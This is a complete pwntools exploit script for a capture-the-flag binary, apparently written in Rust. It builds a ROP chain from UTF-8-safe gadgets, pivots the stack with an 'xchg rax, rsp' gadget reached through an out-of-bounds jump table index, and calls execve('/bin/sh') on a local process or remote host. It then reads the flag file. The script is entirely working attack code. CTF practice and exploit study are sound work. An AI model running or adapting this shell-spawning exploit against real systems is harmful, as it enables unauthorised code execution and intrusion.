from pwn import *

context.binary = e = ELF("./challenge")
if args.HOST:
    r = remote(args.HOST, args.PORT)
else:
    r = process(e.path)

jump_table = 0x2f08e8
buffer = e.sym['_RNvCslo4xS7ANgHU_9challenge6BUFFER']
assert buffer > jump_table, hex(buffer)
assert (buffer - jump_table) % 8 == 0

def make_rop():
    # Gadgets must be valid UTF-8 sequences;
    # easiest to do if all bytes are [0x20, 0x7f]
    POP_RAX_POP_RBX_POP_R14_POP_R15_POP_RBP = 0x297855
    POP_RSI = 0x243431
    SYSCALL = 0x2a6602
    BIN_SH_OFFSET = 0x150
    ADD_RAX_RSI = 0x2d7059
    MOV_RAX_RSI = 0x2e4416
    MOV_RDI_RAX_JMP_RCX = 0x2e5b7b
    POP_RCX = 0x247566
    RET = 0x284d61
    MOV_RDX_RSI = 0x2d5a60

    # At entry, rsp and rsi both point to buffer

    rop_chain = flat({
        0: [
            [POP_RCX, RET],
            [MOV_RAX_RSI], # rax = &buffer
            [POP_RSI, BIN_SH_OFFSET], # rsi = BIN_SH_OFFSET
            [ADD_RAX_RSI], # rax = &"/bin/sh"
            [MOV_RDI_RAX_JMP_RCX], # rdi = &"/bin/sh", rop chain continues
            [POP_RAX_POP_RBX_POP_R14_POP_R15_POP_RBP, constants.SYS_execve, 0, 0, 0, 0], # rax = execve
            [POP_RSI, 0], # rsi = 0
            [MOV_RDX_RSI],
            [SYSCALL],
        ],
        BIN_SH_OFFSET: b"/bin/sh\x00",
    })
    assert len(rop_chain) % 8 == 0
    return rop_chain


r.sendlineafter(b"> ", b"1")

rop_chain = make_rop()
gadget = next(e.search(asm("xchg rax, rsp; ret;")))
payload = rop_chain + p64(gadget)

r.sendlineafter(b"? ", payload)
r.sendlineafter(b"> ", b"2")
# The pointer to our gadget is placed just after our ROP chain
# The gadget pivots the stack into the start of the buffer beginning ROP
offset = ((buffer - jump_table) // 8) + len(rop_chain) // 8
# offset = 0
r.sendlineafter(b"> ", str(offset).encode())

r.sendlineafter(b"> ", b"3")
r.sendline(b"cat flag.txt")
print(r.recvline().decode().strip())